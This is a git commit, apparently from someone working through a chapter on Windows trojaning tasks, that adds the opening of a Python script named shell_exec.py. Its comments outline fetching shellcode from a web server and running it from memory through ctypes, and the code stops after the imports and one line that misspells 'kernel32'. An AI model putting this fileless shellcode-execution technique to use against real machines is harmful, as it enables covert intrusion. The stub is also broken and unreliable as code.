84b9ae6bb0a48de08efcd98125d5ee594dc23d3f
AnLau25 <avald024@uottawa.ca>
2025-06-25 13:18:03 -0400

    shell_exec.py

---
+++ ch8_CommonTrojaningTasksOnWindows/shell_exec.py
@@ -0,0 +1,13 @@
+# Sometimes interacting with target we might need some form of shellcode exec
+# To do so without touching the filesystem, requires a buffer in the memory 
+# The buffer will hold the shellcode and, using ctypes, create a function pointer to that mem
+# Then we just call the function
+
+from urllib import request # to grab shellcode from webserver, in this case
+
+import base64
+import ctypes
+
+kernel32 = ctypes.windll.kernel23
+
+ 
